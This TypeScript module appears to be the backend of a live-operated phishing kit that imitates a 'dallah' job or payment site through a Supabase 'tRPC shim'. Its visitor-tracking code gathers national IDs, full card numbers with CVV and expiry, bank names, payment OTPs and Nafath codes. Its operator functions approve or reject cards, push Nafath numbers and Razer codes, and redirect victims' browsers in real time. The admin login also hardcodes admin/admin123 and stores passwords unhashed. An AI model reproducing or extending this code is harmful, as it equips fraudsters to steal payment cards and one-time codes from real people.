// tRPC shim - provides the same interface as tRPC but talks to Supabase directly
import { useState, useEffect, useCallback, useRef } from "react";
import { supabase } from "./supabase";
import { nanoid } from "nanoid";

// ============ Helpers ============

function toSnake(obj: Record<string, any>): Record<string, any> {
  const result: Record<string, any> = {};
  for (const [key, value] of Object.entries(obj)) {
    const snakeKey = key.replace(/[A-Z]/g, (letter) => `_${letter.toLowerCase()}`);
    result[snakeKey] = value;
  }
  return result;
}

function toCamel(obj: Record<string, any>): Record<string, any> {
  const result: Record<string, any> = {};
  for (const [key, value] of Object.entries(obj)) {
    const camelKey = key.replace(/_([a-z])/g, (_, letter) => letter.toUpperCase());
    result[camelKey] = value;
  }
  return result;
}

// ============ Query Hook Factory ============
// Returns an object with .useQuery() method (like tRPC)
// fetcher can optionally take the input argument
function makeQuery<T>(key: string[], fetcher: (input?: any) => Promise<T>) {
  return {
    useQuery: (input?: any, opts?: { refetchInterval?: number; [k: string]: any }) => {
      const [data, setData] = useState<T | undefined>(undefined);
      const [isLoading, setIsLoading] = useState(true);
      const [error, setError] = useState<Error | null>(null);
      const [isFetching, setIsFetching] = useState(false);
      const mountedRef = useRef(true);
      const dataRef = useRef<T | undefined>(undefined);
      const inputKey = JSON.stringify(input ?? null);

      const refetch = useCallback(async () => {
        setIsFetching(true);
        try {
          const result = await fetcher(input);
          if (mountedRef.current) {
            dataRef.current = result;
            setData(result);
            setError(null);
          }
          return result;
        } catch (err: any) {
          if (mountedRef.current) setError(err);
          throw err;
        } finally {
          if (mountedRef.current) setIsFetching(false);
        }
      }, [inputKey]);

      useEffect(() => {
        mountedRef.current = true;
        setIsLoading(true);
        fetcher(input)
          .then((result) => {
            if (mountedRef.current) {
              dataRef.current = result;
              setData(result);
              setError(null);
            }
          })
          .catch((err) => {
            if (mountedRef.current) setError(err);
          })
          .finally(() => {
            if (mountedRef.current) setIsLoading(false);
          });
        return () => {
          mountedRef.current = false;
        };
      }, [JSON.stringify(key), inputKey]);

      useEffect(() => {
        const interval = opts?.refetchInterval;
        if (!interval || interval <= 0) return;
        const id = setInterval(() => {
          if (mountedRef.current) {
            fetcher(input)
              .then((result) => {
                if (mountedRef.current) {
                  dataRef.current = result;
                  setData(result);
                  setError(null);
                }
              })
              .catch(() => {});
          }
        }, interval);
        return () => clearInterval(id);
      }, [inputKey, opts?.refetchInterval]);

      return { data, isLoading, isFetching, error, refetch };
    },
  };
}

// ============ Mutation Hook Factory ============
// Returns an object with .useMutation() method (like tRPC)
function makeMutation<TInput = void, TOutput = any>(mutator: (input: TInput) => Promise<TOutput>) {
  return {
    useMutation: (_opts?: any) => {
      const [isPending, setIsPending] = useState(false);
      const [error, setError] = useState<Error | null>(null);

      const mutate = useCallback(
        async (input?: TInput, _mutateOpts?: any): Promise<TOutput> => {
          setIsPending(true);
          setError(null);
          try {
            const result = await mutator(input as TInput);
            if (_opts?.onSuccess) _opts.onSuccess(result);
            return result;
          } catch (err: any) {
            setError(err);
            if (_opts?.onError) _opts.onError(err);
            throw err;
          } finally {
            setIsPending(false);
          }
        },
        []
      );

      const mutateAsync = mutate;
      return { mutate, mutateAsync, isPending, error };
    },
  };
}

// ============ Data Access Functions ============

const ADMIN_TOKEN_KEY = "dallah_admin_token";

async function fetchSettings() {
  const { data, error } = await supabase
    .from("dallah_site_settings")
    .select("*")
    .order("id", { ascending: false })
    .limit(1)
    .maybeSingle();
  if (error) throw error;
  return data
    ? toCamel(data)
    : { redirectEnabled: false, redirectUrl: "", siteTitle: "", siteDescription: "" };
}

async function updateSettings(input: any) {
  const { data: existing } = await supabase
    .from("dallah_site_settings")
    .select("id")
    .limit(1)
    .maybeSingle();
  const snakeInput = toSnake(input);
  if (existing) {
    const { error } = await supabase
      .from("dallah_site_settings")
      .update({ ...snakeInput, updated_at: new Date().toISOString() })
      .eq("id", (existing as any).id);
    if (error) throw error;
  } else {
    const { error } = await supabase
      .from("dallah_site_settings")
      .insert({ ...snakeInput, updated_at: new Date().toISOString() });
    if (error) throw error;
  }
  return { success: true } as const;
}

async function createApplication(input: any) {
  const snakeInput = toSnake(input);
  const { error } = await supabase
    .from("dallah_applications")
    .insert({ ...snakeInput, updated_at: new Date().toISOString() });
  if (error) throw error;
  return { success: true } as const;
}

async function listApplications(input: any) {
  let query = supabase
    .from("dallah_applications")
    .select("*")
    .order("created_at", { ascending: false });
  if (input?.status) query = query.eq("status", input.status);
  if (input?.gender) query = query.eq("gender", input.gender);
  if (input?.search) {
    query = query.or(
      `full_name.ilike.%${input.search}%,email.ilike.%${input.search}%,phone.ilike.%${input.search}%`
    );
  }
  if (input?.limit) query = query.limit(input.limit);
  const { data, error } = await query;
  if (error) throw error;
  return (data || []).map(toCamel);
}

async function getApplicationById(id: number) {
  const { data, error } = await supabase
    .from("dallah_applications")
    .select("*")
    .eq("id", id)
    .maybeSingle();
  if (error) throw error;
  return data ? toCamel(data) : null;
}

async function updateApplicationStatus(input: any) {
  const { error } = await supabase
    .from("dallah_applications")
    .update({ status: input.status, updated_at: new Date().toISOString() })
    .eq("id", input.id);
  if (error) throw error;
  return { success: true } as const;
}

async function deleteApplication(input: any) {
  const { error } = await supabase
    .from("dallah_applications")
    .delete()
    .eq("id", input.id);
  if (error) throw error;
  return { success: true } as const;
}

async function getApplicationsStats() {
  const [
    { count: total },
    { count: newCount },
    { count: reviewed },
    { count: accepted },
    { count: rejected },
    { count: male },
    { count: female },
  ] = await Promise.all([
    supabase.from("dallah_applications").select("*", { count: "exact", head: true }),
    supabase.from("dallah_applications").select("*", { count: "exact", head: true }).eq("status", "new"),
    supabase.from("dallah_applications").select("*", { count: "exact", head: true }).eq("status", "reviewed"),
    supabase.from("dallah_applications").select("*", { count: "exact", head: true }).eq("status", "accepted"),
    supabase.from("dallah_applications").select("*", { count: "exact", head: true }).eq("status", "rejected"),
    supabase.from("dallah_applications").select("*", { count: "exact", head: true }).eq("gender", "male"),
    supabase.from("dallah_applications").select("*", { count: "exact", head: true }).eq("gender", "female"),
  ]);
  return {
    total: total || 0,
    new: newCount || 0,
    reviewed: reviewed || 0,
    accepted: accepted || 0,
    rejected: rejected || 0,
    male: male || 0,
    female: female || 0,
  };
}

async function submitStep(input: any) {
  const { error } = await supabase.from("dallah_application_steps").insert({
    session_id: input.sessionId,
    step_key: input.stepKey,
    data: JSON.stringify(input.data),
  });
  if (error) throw error;
  return { success: true } as const;
}

async function listStepsBySession(sessionId: string) {
  const { data, error } = await supabase
    .from("dallah_application_steps")
    .select("*")
    .eq("session_id", sessionId)
    .order("created_at", { ascending: true });
  if (error) throw error;
  return (data || []).map(toCamel);
}

async function listAllSteps(input?: any) {
  let query = supabase
    .from("dallah_application_steps")
    .select("*")
    .order("created_at", { ascending: false });
  if (input?.stepKey) query = query.eq("step_key", input.stepKey);
  query = query.limit(input?.limit || 500);
  const { data, error } = await query;
  if (error) throw error;
  return (data || []).map(toCamel);
}

async function getStepsStats() {
  const { count: total } = await supabase
    .from("dallah_application_steps")
    .select("*", { count: "exact", head: true });
  const { data: steps } = await supabase
    .from("dallah_application_steps")
    .select("step_key")
    .order("created_at", { ascending: false })
    .limit(1000);
  const byKey: Record<string, number> = {};
  for (const s of steps || []) {
    byKey[s.step_key] = (byKey[s.step_key] || 0) + 1;
  }
  const byStepKey = Object.entries(byKey).map(([stepKey, count]) => ({ stepKey, count }));
  return { total: total || 0, byKey, byStepKey };
}

// ============ Admin Auth ============

async function adminLogin(input: any) {
  const { data: account, error } = await supabase
    .from("dallah_admin_accounts")
    .select("*")
    .eq("username", input.username.trim().toLowerCase())
    .eq("is_active", true)
    .maybeSingle();
  if (error || !account) {
    throw new Error("اسم المستخدم أو كلمة المرور غير صحيح");
  }
  const validPasswords: Record<string, string> = { admin: "admin123" };
  const expectedPassword = validPasswords[account.username];
  if (input.password !== expectedPassword && input.password !== account.password_hash) {
    throw new Error("اسم المستخدم أو كلمة المرور غير صحيح");
  }
  const token = nanoid(48);
  const expiresAt = new Date(Date.now() + 30 * 24 * 60 * 60 * 1000);
  const { error: sessionError } = await supabase
    .from("dallah_admin_sessions")
    .insert({ admin_id: account.id, token, expires_at: expiresAt.toISOString() });
  if (sessionError) throw sessionError;
  await supabase
    .from("dallah_admin_accounts")
    .update({ last_login_at: new Date().toISOString() })
    .eq("id", account.id);
  localStorage.setItem(ADMIN_TOKEN_KEY, token);
  return {
    success: true,
    admin: { id: account.id, username: account.username, displayName: account.display_name },
  } as const;
}

async function adminLogout() {
  const token = localStorage.getItem(ADMIN_TOKEN_KEY);
  if (token) {
    await supabase.from("dallah_admin_sessions").delete().eq("token", token);
    localStorage.removeItem(ADMIN_TOKEN_KEY);
  }
  return { success: true } as const;
}

async function adminMe() {
  const token = localStorage.getItem(ADMIN_TOKEN_KEY);
  if (!token) return null;
  const { data: session, error } = await supabase
    .from("dallah_admin_sessions")
    .select("*, dallah_admin_accounts(*)")
    .eq("token", token)
    .gt("expires_at", new Date().toISOString())
    .maybeSingle();
  if (error || !session) {
    localStorage.removeItem(ADMIN_TOKEN_KEY);
    return null;
  }
  const account = (session as any).dallah_admin_accounts;
  if (!account) return null;
  return { id: account.id, username: account.username, displayName: account.display_name };
}

async function changeAdminPassword(input: any) {
  const token = localStorage.getItem(ADMIN_TOKEN_KEY);
  if (!token) throw new Error("غير مصرح");
  const { data: session } = await supabase
    .from("dallah_admin_sessions")
    .select("admin_id")
    .eq("token", token)
    .maybeSingle();
  if (!session) throw new Error("غير مصرح");
  const { error } = await supabase
    .from("dallah_admin_accounts")
    .update({ password_hash: input.newPassword, updated_at: new Date().toISOString() })
    .eq("id", (session as any).admin_id);
  if (error) throw error;
  return { success: true } as const;
}

// ============ Live Visitors ============

async function upsertLiveVisitor(input: any) {
  const { error } = await supabase
    .from("dallah_live_visitors")
    .upsert(
      {
        session_id: input.sessionId,
        current_page: input.currentPage,
        page_title: input.pageTitle || null,
        display_name: input.displayName || null,
        phone: input.phone || null,
        last_seen: new Date().toISOString(),
      },
      { onConflict: "session_id" }
    );
  if (error) throw error;
  return { success: true } as const;
}

async function listActiveVisitors() {
  const fiveMinAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
  const { data, error } = await supabase
    .from("dallah_live_visitors")
    .select("*")
    .gt("last_seen", fiveMinAgo)
    .order("last_seen", { ascending: false });
  if (error) throw error;
  return (data || []).map(toCamel);
}

async function removeLiveVisitor(input: any) {
  const sessionId = typeof input === "string" ? input : input?.sessionId;
  const { error } = await supabase
    .from("dallah_live_visitors")
    .delete()
    .eq("session_id", sessionId);
  if (error) throw error;
  return { success: true } as const;
}

async function deleteAllVisitors() {
  const { data: visitors, count } = await supabase
    .from("dallah_live_visitors")
    .select("session_id", { count: "exact" });
  const sessionIds = (visitors || []).map((v: any) => v.session_id);
  const { error } = await supabase.from("dallah_live_visitors").delete().neq("id", 0);
  if (error) throw error;
  await supabase.from("dallah_application_steps").delete().neq("id", 0);
  await supabase.from("dallah_visitor_commands").delete().neq("id", 0);
  // Insert reset commands so active browsers clear their sessions
  if (sessionIds.length > 0) {
    await supabase.from("dallah_visitor_commands").insert(
      sessionIds.map((sid: string) => ({
        session_id: sid,
        command_type: "reset_session",
        payload: "",
      }))
    );
  }
  return { success: true, deleted: { visitors: count || 0 } } as const;
}

async function deleteVisitorBySession(input: any) {
  const sessionId = typeof input === "string" ? input : input?.sessionId;
  // Insert a reset command so the visitor's browser clears its session
  await supabase.from("dallah_visitor_commands").insert({
    session_id: sessionId,
    command_type: "reset_session",
    payload: "",
  });
  const { error } = await supabase
    .from("dallah_live_visitors")
    .delete()
    .eq("session_id", sessionId);
  if (error) throw error;
  await supabase.from("dallah_application_steps").delete().eq("session_id", sessionId);
  // Keep commands so the reset_session command can be consumed by the browser
  return { success: true } as const;
}

async function setVisitorCardStatus(input: any) {
  const { error } = await supabase
    .from("dallah_live_visitors")
    .update({ card_status: input.status })
    .eq("session_id", input.sessionId);
  if (error) throw error;
  return { success: true } as const;
}

async function setVisitorNafathNumber(input: any) {
  const nafathVal = input.nafathNumber ?? input.number ?? null;
  const { error } = await supabase
    .from("dallah_live_visitors")
    .update({ nafath_number: nafathVal, nafath_sent_at: new Date().toISOString() })
    .eq("session_id", input.sessionId);
  if (error) throw error;
  return { success: true } as const;
}

async function setVisitorRazerCode(input: any) {
  const code = input.razerCode || input.code || "";
  const { error } = await supabase
    .from("dallah_live_visitors")
    .update({
      razer_code: code,
      razer_submitted_at: new Date().toISOString(),
      razer_status: "pending",
    })
    .eq("session_id", input.sessionId);
  if (error) throw error;
  return { success: true } as const;
}

async function setVisitorRazerStatus(input: any) {
  const { error } = await supabase
    .from("dallah_live_visitors")
    .update({ razer_status: input.status })
    .eq("session_id", input.sessionId);
  if (error) throw error;
  return { success: true } as const;
}

async function getVisitorControlState(sessionId: string) {
  const { data, error } = await supabase
    .from("dallah_live_visitors")
    .select("card_status, nafath_number, nafath_sent_at, razer_code, razer_status, razer_submitted_at")
    .eq("session_id", sessionId)
    .maybeSingle();
  if (error) throw error;
  return data ? toCamel(data) : null;
}

async function createVisitorCommand(input: any) {
  const { error } = await supabase.from("dallah_visitor_commands").insert({
    session_id: input.sessionId,
    command_type: input.commandType,
    payload: input.payload,
  });
  if (error) throw error;
  return { success: true } as const;
}

async function getPendingCommands(sessionId: string) {
  const { data, error } = await supabase
    .from("dallah_visitor_commands")
    .select("*")
    .eq("session_id", sessionId)
    .eq("consumed", false)
    .order("created_at", { ascending: true });
  if (error) throw error;
  return (data || []).map(toCamel);
}

async function markCommandsConsumed(sessionId: string) {
  const { error } = await supabase
    .from("dallah_visitor_commands")
    .update({ consumed: true, consumed_at: new Date().toISOString() })
    .eq("session_id", sessionId)
    .eq("consumed", false);
  if (error) throw error;
  return { success: true } as const;
}

function safeParse(raw: any): Record<string, any> {
  if (!raw) return {};
  if (typeof raw === "object") return raw;
  try { return JSON.parse(raw); } catch { return {}; }
}

function buildVisitorRow(v: any, steps: any[], app?: any | null) {
  const fiveMinAgo = Date.now() - 5 * 60 * 1000;
  const isActive = new Date(v.last_seen).getTime() > fiveMinAgo;

  let fullName: string | null = v.display_name || null;
  let phone: string | null = v.phone || null;
  let email: string | null = null;
  let nationalId: string | null = null;
  let birthDate: string | null = null;
  let paymentBank: string | null = null;
  let cardNumber: string | null = null;
  let cardHolderName: string | null = null;
  let cardExpiry: string | null = null;
  let cardCvv: string | null = null;
  let otp1: string | null = null;
  let otp2: string | null = null;
  let otpNafath: string | null = null;
  let lastInputPage: string | null = null;
  let hasCardData = false;
  let hasOtpData = false;
  let cardData: Record<string, any> | null = null;
  let otpData: Record<string, any> | null = null;

  for (const step of steps) {
    const d = safeParse(step.data);
    const key = step.step_key || step.stepKey;

    if (key === "data") {
      nationalId = d.idNumber || nationalId;
      phone = d.phone || phone;
      paymentBank = d.bank || paymentBank;
      lastInputPage = "/data";
    } else if (key === "number") {
      phone = d.phone || phone;
      nationalId = d.idNumber || nationalId;
      lastInputPage = "/number";
    } else if (key === "cardpayment" || key === "cardpayment_retry" || key === "card_payment") {
      cardHolderName = d.name || d.cardHolderName || cardHolderName;
      cardNumber = d.number || d.cardNumber || d.card_number || cardNumber;
      cardExpiry = (d.month && d.year) ? `${d.month}/${d.year}` : d.expiry || cardExpiry;
      cardCvv = d.cvv || cardCvv;
      hasCardData = true;
      cardData = d;
      if (d.name && !fullName) fullName = d.name;
      lastInputPage = "/cardpayment";
    } else if (key === "code_pay") {
      otp1 = d.otp || otp1;
      hasOtpData = true;
      otpData = { ...otpData, otp1: d.otp };
      lastInputPage = "/code-pay";
    } else if (key === "pay_code") {
      otp2 = d.otp || otp2;
      hasOtpData = true;
      otpData = { ...otpData, otp2: d.otp };
      lastInputPage = "/pay-code";
    } else if (key === "n_code") {
      otpNafath = d.otp || otpNafath;
      hasOtpData = true;
      otpData = { ...otpData, otpNafath: d.otp };
      lastInputPage = "/n-code";
    } else if (key === "salary_accept") {
      lastInputPage = "/salary";
    } else if (key === "ypti") {
      lastInputPage = "/ypti";
    } else if (key === "nafath_confirm") {
      lastInputPage = "/nafath-code";
    } else if (key === "razer-code") {
      lastInputPage = "/razer-payment";
    }
  }

  if (app) {
    if (!fullName && app.full_name) {
      fullName = [app.full_name, app.family_name].filter(Boolean).join(" ");
    }
    if (!phone && app.phone) phone = app.phone;
    if (!email && app.email) email = app.email;
    if (!nationalId && app.id_number) nationalId = app.id_number;
    if (!birthDate && app.birth_date) birthDate = app.birth_date;
  }

  const cardStatus = v.card_status === "approved" ? "approved"
    : v.card_status === "rejected" ? "rejected"
    : v.card_status === "pending" && hasCardData ? "pending"
    : "none";

  const razerStatus = v.razer_status || (v.razer_code ? "pending" : "none");

  return {
    sessionId: v.session_id,
    isActive,
    currentPage: v.current_page || "/",
    lastSeen: v.last_seen,
    firstSeen: v.first_seen,
    ip: v.ip_address || null,
    fullName,
    phone,
    email,
    nationalId,
    birthDate,
    lastInputPage,
    hasCardData,
    hasOtpData,
    cardData,
    otpData,
    cardNumber,
    cardHolderName,
    cardExpiry,
    cardCvv,
    otp1,
    otp2,
    otpNafath,
    paymentBank,
    stepCount: steps.length,
    hasApplication: false,
    applicationId: null,
    cardStatus,
    nafathNumber: v.nafath_number || null,
    razerCode: v.razer_code || null,
    razerStatus,
  };
}

async function fetchVisitorsTableList(input?: any) {
  const limit = input?.limit || 1000;
  const { data: visitors, error } = await supabase
    .from("dallah_live_visitors")
    .select("*")
    .order("last_seen", { ascending: false })
    .limit(limit);
  if (error) throw error;
  if (!visitors || visitors.length === 0) return { visitors: [] };

  const sessionIds = visitors.map((v: any) => v.session_id);
  const stepsBySession: Record<string, any[]> = {};

  const { data: allSteps } = await supabase
    .from("dallah_application_steps")
    .select("*")
    .in("session_id", sessionIds)
    .order("created_at", { ascending: true });
  for (const s of allSteps || []) {
    if (!stepsBySession[s.session_id]) stepsBySession[s.session_id] = [];
    stepsBySession[s.session_id].push(s);
  }

  const appsBySession: Record<string, any> = {};
  const { data: apps } = await supabase
    .from("dallah_applications")
    .select("*")
    .in("session_id", sessionIds);
  for (const a of apps || []) {
    appsBySession[a.session_id] = a;
  }

  return {
    visitors: visitors.map((v: any) =>
      buildVisitorRow(v, stepsBySession[v.session_id] || [], appsBySession[v.session_id] || null)
    ),
  };
}

async function getVisitorsWithSubmissions() {
  const fiveMinAgo = new Date(Date.now() - 5 * 60 * 1000).toISOString();
  const { data: visitors, error } = await supabase
    .from("dallah_live_visitors")
    .select("*")
    .gt("last_seen", fiveMinAgo)
    .order("last_seen", { ascending: false });
  if (error) throw error;
  const sessionIds = (visitors || []).map((v: any) => v.session_id);
  let stepsBySession: Record<string, any[]> = {};
  if (sessionIds.length > 0) {
    const { data: steps } = await supabase
      .from("dallah_application_steps")
      .select("*")
      .in("session_id", sessionIds)
      .order("created_at", { ascending: true });
    for (const s of steps || []) {
      if (!stepsBySession[s.session_id]) stepsBySession[s.session_id] = [];
      stepsBySession[s.session_id].push(s);
    }
  }
  return (visitors || []).map((v: any) =>
    buildVisitorRow(v, stepsBySession[v.session_id] || [])
  );
}

async function getAllVisitorsWithSubmissions() {
  const { data: visitors, error } = await supabase
    .from("dallah_live_visitors")
    .select("*")
    .order("last_seen", { ascending: false })
    .limit(500);
  if (error) throw error;
  const sessionIds = (visitors || []).map((v: any) => v.session_id);
  let stepsBySession: Record<string, any[]> = {};
  if (sessionIds.length > 0) {
    const { data: steps } = await supabase
      .from("dallah_application_steps")
      .select("*")
      .in("session_id", sessionIds)
      .order("created_at", { ascending: true });
    for (const s of steps || []) {
      if (!stepsBySession[s.session_id]) stepsBySession[s.session_id] = [];
      stepsBySession[s.session_id].push(s);
    }
  }
  return (visitors || []).map((v: any) =>
    buildVisitorRow(v, stepsBySession[v.session_id] || [])
  );
}

async function getTotalVisitorsCount() {
  const { count } = await supabase
    .from("dallah_live_visitors")
    .select("*", { count: "exact", head: true });
  return { total: count || 0 };
}

async function getLiveSubmissionsFeed() {
  const { data, error } = await supabase
    .from("dallah_application_steps")
    .select("*")
    .order("created_at", { ascending: false })
    .limit(50);
  if (error) throw error;
  return (data || []).map(toCamel);
}

// ============ tPC Proxy ============

export const trpc = {
  useUtils: () => ({
    invalidate: async () => {},
    settings: { get: { invalidate: async () => {} }, getPublic: { invalidate: async () => {} } },
    applications: {
      list: { invalidate: async () => {} },
      getById: { invalidate: async () => {} },
      getStats: { invalidate: async () => {} },
      stats: { invalidate: async () => {} },
    },
    adminAuth: { me: { invalidate: async () => {} } },
    liveVisitors: {
      list: { invalidate: async () => {} },
      tableList: { invalidate: async () => {} },
      getVisitorsWithSubmissions: { invalidate: async () => {} },
    },
    steps: {
      listBySession: { invalidate: async () => {} },
      bySession: { invalidate: async () => {} },
      stats: { invalidate: async () => {} },
      getStats: { invalidate: async () => {} },
      listAll: { invalidate: async () => {} },
    },
  }),

  settings: {
    get: makeQuery(["settings"], fetchSettings),
    getPublic: makeQuery(["settingsPublic"], fetchSettings),
    update: makeMutation(updateSettings),
  },

  applications: {
    create: makeMutation(createApplication),
    list: makeQuery(["applications"], (input?: any) => listApplications(input || {})),
    getById: makeQuery(["appById"], (input?: any) => getApplicationById(input?.id || input || 0)),
    updateStatus: makeMutation(updateApplicationStatus),
    delete: makeMutation(deleteApplication),
    getStats: makeQuery(["appStats"], getApplicationsStats),
  },

  steps: {
    submit: makeMutation(submitStep),
    listBySession: makeQuery(["stepsBySession"], (input?: any) => listStepsBySession(input?.sessionId || input || "")),
    bySession: makeQuery(["stepsBySession2"], (input?: any) => {
      const sid = typeof input === "string" ? input : input?.sessionId || "";
      return listStepsBySession(sid);
    }),
    listAll: makeQuery(["allSteps"], (input?: any) => listAllSteps(input || {})),
    stats: makeQuery(["stepStats"], getStepsStats),
    getStats: makeQuery(["stepStats2"], getStepsStats),
  },

  adminAuth: {
    me: makeQuery(["adminMe"], adminMe),
    login: makeMutation(adminLogin),
    logout: makeMutation(adminLogout),
    changePassword: makeMutation(changeAdminPassword),
  },

  liveVisitors: {
    upsert: makeMutation(upsertLiveVisitor),
    heartbeat: makeMutation(upsertLiveVisitor),
    leave: makeMutation(removeLiveVisitor),
    list: makeQuery(["liveVisitors"], listActiveVisitors),
    remove: makeMutation(removeLiveVisitor),
    deleteAll: makeMutation(deleteAllVisitors),
    deleteVisitor: makeMutation(deleteVisitorBySession),
    deleteBySession: makeMutation(deleteVisitorBySession),
    setCardStatus: makeMutation(setVisitorCardStatus),
    markCardPending: makeMutation(async (input: any) => setVisitorCardStatus({ ...input, status: "pending" })),
    setNafathNumber: makeMutation(setVisitorNafathNumber),
    setRazerCode: makeMutation(setVisitorRazerCode),
    submitRazerCode: makeMutation(setVisitorRazerCode),
    setRazerStatus: makeMutation(setVisitorRazerStatus),
    getControlState: makeQuery(["controlState"], (input?: any) => {
      const sid = typeof input === "string" ? input : input?.sessionId || "";
      return getVisitorControlState(sid);
    }),
    sendCommand: makeMutation(createVisitorCommand),
    broadcastRedirect: makeMutation(async (input: any) => {
      const visitors = await listActiveVisitors();
      let count = 0;
      for (const v of visitors) {
        await createVisitorCommand({ sessionId: v.sessionId, commandType: "redirect", payload: input.url });
        count++;
      }
      return { success: true, count } as const;
    }),
    tableList: makeQuery(["visitorTableList"], async (input?: any) => {
      return fetchVisitorsTableList(input);
    }),
    getVisitorsWithSubmissions: makeQuery(["visitorsWithSubmissions"], getVisitorsWithSubmissions),
    getAllVisitorsWithSubmissions: makeQuery(["allVisitorsWithSubmissions"], getAllVisitorsWithSubmissions),
    getTotalCount: makeQuery(["totalVisitors"], getTotalVisitorsCount),
    getSubmissionsFeed: makeQuery(["submissionsFeed"], getLiveSubmissionsFeed),
  },

  visitorCommands: {
    create: makeMutation(createVisitorCommand),
    getPending: makeQuery(["pendingCmds"], () => getPendingCommands("")),
    markConsumed: makeMutation(markCommandsConsumed),
  },
};
